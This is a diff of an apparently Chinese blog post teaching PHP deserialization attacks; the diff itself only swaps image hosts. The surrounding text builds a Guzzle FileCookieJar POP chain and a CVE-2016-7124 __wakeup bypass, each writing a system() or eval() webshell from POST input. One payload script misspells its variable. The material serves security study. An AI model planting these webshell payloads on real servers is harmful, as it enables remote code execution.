@@ -467,21 +467,21 @@ height:50vh;
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./test.php"</span>;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line">$object-&gt;set_flag(<span class="string">'Active'</span>);</span><br><span class="line">$data = serialize($object);</span><br><span class="line">file_put_contents(<span class="string">'serialize.txt'</span>, $data);</span><br></pre></td></tr></table></figure>
 <p>代码不难懂，我们通过生成的序列化字符串，来细致的分析一下序列化的格式：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999100639649.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999100639649.jpg" alt=""></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"testflag"</span>;s:<span class="number">6</span>:<span class="string">"Active"</span>;&#125;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="3-注意"><a href="#3-注意" class="headerlink" title="3. 注意"></a>3. 注意</h2><p>这里有一个需要注意的地方，<code>testflag</code>明明是长度为8的字符串，为什么在序列化中显示其长度为10？</p>
 <p>翻阅php官方文档我们可以找到答案：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999107284787.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999107284787.jpg" alt=""></p>
 <p>对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999111683485.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999111683485.jpg" alt=""></p>
 <p>所以说，在我们需要传入该序列化字符串时，需要补齐两个空字节：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"%00test%00flag"</span>;s:<span class="number">6</span>:<span class="string">"Active"</span>;&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="4-反序列化示例"><a href="#4-反序列化示例" class="headerlink" title="4. 反序列化示例"></a>4. 反序列化示例</h2><blockquote>
 <p>unserialize.php</p>
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filename = file_get_contents($filename);</span><br><span class="line"></span><br><span class="line">$object = unserialize($filename);</span><br><span class="line"></span><br><span class="line">var_dump($object-&gt;get_flag());</span><br><span class="line">var_dump($object);</span><br></pre></td></tr></table></figure>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999120371570.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999120371570.jpg" alt=""></p>
 <h1 id="0x02-PHP（反）序列化有关的魔法函数"><a href="#0x02-PHP（反）序列化有关的魔法函数" class="headerlink" title="0x02 PHP（反）序列化有关的魔法函数"></a>0x02 PHP（反）序列化有关的魔法函数</h1><ul>
 <li><p><strong>construct(), </strong>destruct()</p>
 <p>  构造函数与析构函数</p>
@@ -553,13 +553,13 @@ height:50vh;
 <p>pop_unserialize.php</p>
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./popdemo.php"</span>;</span><br><span class="line">unserialize(file_get_contents(<span class="string">'./pop_serialized.txt'</span>));</span><br></pre></td></tr></table></figure>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999166628793.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999166628793.jpg" alt=""></p>
 <p>表面看上去，我们完美的执行了代码的功能，那么我们改一下序列化代码，看一看效果：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999171016380.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999171016380.jpg" alt=""></p>
 <p>改为：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"popdemo"</span>:<span class="number">2</span>:&#123;s:<span class="number">13</span>:<span class="string">"popdemodata"</span>;s:<span class="number">5</span>:<span class="string">"hack</span></span><br><span class="line"><span class="string">"</span>;s:<span class="number">17</span>:<span class="string">"popdemofilename"</span>;s:<span class="number">6</span>:<span class="string">"./hack"</span>;&#125;</span><br></pre></td></tr></table></figure>
 <p>便执行了我们想要执行的效果：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999174258769.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999174258769.jpg" alt=""></p>
 <h2 id="3-Autoloading与（反）序列化威胁"><a href="#3-Autoloading与（反）序列化威胁" class="headerlink" title="3. Autoloading与（反）序列化威胁"></a>3. Autoloading与（反）序列化威胁</h2><ul>
 <li>PHP只能<code>unserialize()</code>那些定义了的类</li>
 <li>传统的PHP要求应用程序导入每个类中的所有类文件，这样就意味着每个PHP文件需要一列长长的<code>include</code>或<code>require</code>方法，而在当前主流的PHP框架中，都采用了Autoloading自动加载类来完成这样繁重的工作。</li>
@@ -567,7 +567,7 @@ height:50vh;
 </ul>
 <p>举个例子：</p>
 <p>目录结构为下：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999254540532.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999254540532.jpg" alt=""></p>
 <blockquote>
 <p>index.php</p>
 </blockquote>
@@ -578,13 +578,13 @@ height:50vh;
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1_data = <span class="string">'test1_data'</span>;</span><br><span class="line">    <span class="keyword">private</span> $test1_filename = <span class="string">'./test1_demo.txt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;test1_filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($test1_filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        file_put_contents($test1_filename, <span class="keyword">$this</span>-&gt;test1_data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>其余的<code>test2</code>和<code>test3</code>和<code>test1</code>的内容类似。</p>
 <p>运行一下<code>index.php</code>：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999262214593.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999262214593.jpg" alt=""></p>
 <p>可以看到已经自动加载类会自动寻找已经注册在其队列中的类，并在其被实例化的时候，执行相关的操作。</p>
 <p>若想了解更多关于自动加载类的资料，请查阅<a href="http://lucifaer.com/index.php/archives/17/">spl_autoload_register</a></p>
 <h2 id="4-Composer与Autoloading"><a href="#4-Composer与Autoloading" class="headerlink" title="4. Composer与Autoloading"></a>4. Composer与Autoloading</h2><p>说到了Autoloader自动加载类，就不得不说一下Composer这个东西了。Composer是PHP用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。</p>
 <p>经常搭建框架环境的同学应该对这个非常熟悉了，无论是搭建一个新的Laravel还是一个新的Symfony，安装步骤中总有一步是通过Composer来进行安装。</p>
 <p>比如在安装Laravel的时候，执行<code>composer global require &quot;laravel/installer&quot;</code>就可以搭建成以下目录结构的环境：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999270597374.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999270597374.jpg" alt=""></p>
 <p>其中已经将环境所需的依赖库文件配置完毕，正是因为Composer与Autuoloading的有效结合，才构成了完整的POP数据流。</p>
 <h1 id="0x04-反序列化漏洞的挖掘"><a href="#0x04-反序列化漏洞的挖掘" class="headerlink" title="0x04 反序列化漏洞的挖掘"></a>0x04 反序列化漏洞的挖掘</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>通过上面对Composer的介绍，我们可以看出，Composer所拉取的依赖库文件是一个框架的基础。</p>
 <p>而Composer默认是从Packagist来下载依赖库的。</p>
@@ -633,26 +633,26 @@ height:50vh;
 <p>寻找POP组件的最好方式，就是直接看<code>composer.json</code>文件，该文件中写明了应用需要使用的库。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &#123;</span><br><span class="line">    <span class="string">"require"</span>: &#123;</span><br><span class="line">    <span class="string">"cartalyst/sentry"</span>: <span class="string">"2.1.5"</span>,</span><br><span class="line">    <span class="string">"illuminate/database"</span>: <span class="string">"4.0.*"</span>,</span><br><span class="line">    <span class="string">"guzzlehttp/guzzle"</span>: <span class="string">"6.0.2"</span>,</span><br><span class="line">    <span class="string">"swiftmailer/swiftmailer"</span>: <span class="string">"5.4.1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h4 id="2-寻找可以利用的POP组件"><a href="#2-寻找可以利用的POP组件" class="headerlink" title="2. 寻找可以利用的POP组件"></a>2. 寻找可以利用的POP组件</h4><p>我们下载guzzlehttp/guzzle这个依赖库，并使用grep来搜索一下<code>__destruct()</code>和<code>__wakeup()</code></p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999994724838.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999994724838.jpg" alt=""></p>
 <p>逐个看一下，在/guzzle/src/Cookie/FileCookieJar.php发现可利用的POP组件：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999995535422.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999995535422.jpg" alt=""></p>
 <p>跟进看一下save方法：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999996019593.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999996019593.jpg" alt=""></p>
 <p>存在一下代码，造成任意文件写操作：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === file_put_contents($filename, $jsonStr))</span><br></pre></td></tr></table></figure>
 <p>注意到现在<code>$filename</code>可控，也就是文件名可控。同时看到<code>$jsonStr</code>为上层循环来得到的数组经过json编码后得到的，且数组内容为<code>$cookie-&gt;toArray()</code>，也就是说如果我们可控<code>$cookie-&gt;toArray()</code>的值，我们就能控制文件内容。</p>
 <p>如何找到<code>$cookie</code>呢？注意到前面</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000019016695.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000019016695.jpg" alt=""></p>
 <p>跟进父类，看到父类implements了CookieJarInterface</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000019757754.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000019757754.jpg" alt=""></p>
 <p>还有其中的toArray方法</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000020174432.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000020174432.jpg" alt=""></p>
 <p>很明显调用了其中的SetCookie的接口：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000021165941.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000021165941.jpg" alt=""></p>
 <p>看一下目录结构：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000021860870.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000021860870.jpg" alt=""></p>
 <p>所以定位到SetCookie.php：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000022331337.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000022331337.jpg" alt=""></p>
 <p>可以看到，这里只是简单的返回了data数组的特定键值。</p>
 <h4 id="3-手动验证，并构建POP链"><a href="#3-手动验证，并构建POP链" class="headerlink" title="3. 手动验证，并构建POP链"></a>3. 手动验证，并构建POP链</h4><p>首先我们先在vm中写一个composer.json文件：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"require"</span>: &#123;</span><br><span class="line">        <span class="attr">"guzzlehttp/guzzle"</span>: <span class="string">"6.0.2"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -660,14 +660,14 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sS https://getcomposer.org/installer | php</span><br></pre></td></tr></table></figure>
 <p>然后根据composer.json来安装依赖库：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php composer.phar install</span><br></pre></td></tr></table></figure>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000052755445.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000052755445.jpg" alt=""></p>
 <p>接下来，我们根据上面的分析，来构造payload：</p>
 <blockquote>
 <p>payload.php</p>
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">FileCookieJar</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span>\<span class="title">SetCookie</span>;</span><br><span class="line"></span><br><span class="line">        $obj = <span class="keyword">new</span> FileCookieJar(<span class="string">'./shell.php'</span>);</span><br><span class="line"></span><br><span class="line">        $payload = <span class="string">'&lt;?php echo system($_POST[\'poc\']);?&gt;'</span>;</span><br><span class="line">        $obj-&gt;setCookie(<span class="keyword">new</span> SetCookie([</span><br><span class="line">                <span class="string">'Name'</span> =&gt; <span class="string">'lucifaer'</span>,</span><br><span class="line">                <span class="string">'Value'</span> =&gt; <span class="string">'test_poc'</span>,</span><br><span class="line">                <span class="string">'Domain'</span> =&gt; $paylaod,</span><br><span class="line">                <span class="string">'Expires'</span> =&gt; time()</span><br><span class="line">        ]));</span><br><span class="line"></span><br><span class="line">        file_put_contents(<span class="string">'./build_poc'</span>, serialize($obj));</span><br></pre></td></tr></table></figure>
 <p>我们执行完该脚本，看一下生成的脚本的内容：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000080660821.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000080660821.jpg" alt=""></p>
 <p>我们再写一个反序列化的demo脚本：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line">    unserialize(file_get_contents(<span class="string">"./build_poc"</span>));</span><br></pre></td></tr></table></figure>
 <p>运行后，完成任意文件写操作。至此，我们可以利用生成的序列化攻击向量来进行测试。</p>
@@ -681,15 +681,15 @@ height:50vh;
 <p>根据cve-2016-7124我们可以构造一下我们的poc：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $poc = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poc)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poc = $poc;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;poc != <span class="string">''</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                file_put_contents(<span class="string">'shell.php'</span>, <span class="string">'&lt;?php eval($_POST[\'shell\']);?&gt;'</span>);</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Success!!!'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'fail to getshell!!!'</span>);</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"waking up...\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">$a = <span class="keyword">new</span> Test(<span class="string">'shell'</span>);</span><br><span class="line">$poc = serialize($a);</span><br><span class="line"><span class="keyword">print</span>($poc);</span><br></pre></td></tr></table></figure>
 <p>运行该脚本，我们就获得了我们poc</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000946064992.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000946064992.jpg" alt=""></p>
 <p>通上文所说道的，在这里需要改两个地方：</p>
 <ul>
 <li>将1改为大于1的任何整数</li>
 <li>将<code>Testpoc</code>改为<code>%00Test%00poc</code></li>
 </ul>
 <p>传入修改后的poc，即可看到：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000947516393.jpg" alt=""></p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15000947623762.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000947516393.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15000947623762.jpg" alt=""></p>
 <p>写文件操作执行成功。</p>
 <h1 id="0x05-拓展思路"><a href="#0x05-拓展思路" class="headerlink" title="0x05 拓展思路"></a>0x05 拓展思路</h1><h2 id="1-抛砖引玉——魔法函数可能造成的威胁"><a href="#1-抛砖引玉——魔法函数可能造成的威胁" class="headerlink" title="1. 抛砖引玉——魔法函数可能造成的威胁"></a>1. 抛砖引玉——魔法函数可能造成的威胁</h2><p>刚刚想到这一点的时候准备好好研究一下，没想到p师傅第二天小密圈就放出来这个话题了。接下来顺着这个思路，我们向下深挖一下。</p>
 <h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>经过上面的总结，我们不难看出，PHP中反序列化导致的漏洞中，除了利用PHP本身的漏洞以外，我们通常会寻找<code>__destruct</code>、<code>__wakeup</code>、<code>__toString</code>等方法，看看这些方法中是否有可利用的代码。</p>
@@ -709,7 +709,7 @@ height:50vh;
 </blockquote>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">toString_demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1 = <span class="string">'test1'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = $test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__destruct:"</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;test1;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__wakeup:"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = <span class="string">"wakeup"</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;test1.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __toString() method.</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"__toString:"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test1 = <span class="string">"tosTRING"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test1.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> toString_demo(<span class="string">"demo"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$c = unserialize($b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//print "\n".$a."\n";</span></span><br><span class="line"><span class="comment">//print $b."\n";</span></span><br><span class="line"><span class="keyword">print</span> $c;</span><br></pre></td></tr></table></figure>
 <p>执行结果为下：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001060847306.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001060847306.jpg" alt=""></p>
 <p>通过上面的测试，可以总结以下几点：</p>
 <ul>
 <li><code>echo ($obj) / print($obj)</code> 打印时会触发</li>
@@ -724,22 +724,22 @@ height:50vh;
 <h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><ul>
 <li><p>字符串拼接：</p>
 <p>  在字符串与反序列化后的对象与字符串进行字符串拼接时，会触发<code>__toString</code>方法。</p>
-<p>  <img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001078785425.jpg" alt=""></p>
+<p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001078785425.jpg" alt=""></p>
 </li>
 <li><p>字符串函数：</p>
 <p>  经过测试，当反序列化后的最想在经过php字符串函数时，都会执行<code>__toString</code>方法，从这一点我们就可以看出，<code>__toString</code>所可能造成的安全隐患。</p>
 <p>  下面举几个常见的函数作为例子（所使用的类还是上面给出的toString_demo类）：</p>
-<p>  <img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001086072919.jpg" alt=""></p>
+<p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001086072919.jpg" alt=""></p>
 </li>
 </ul>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001088645356.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001088645356.jpg" alt=""></p>
 <h4 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h4><p>将反序列化后的对象加入到数组中，并不会触发<code>__toString</code>方法：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001858902513.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001858902513.jpg" alt=""></p>
 <p>但是在<code>in_array()</code>方法中，在数组中有<code>__toString</code>返回的字符串的时候<code>__toString</code>会被调用：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001890784548.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001890784548.jpg" alt=""></p>
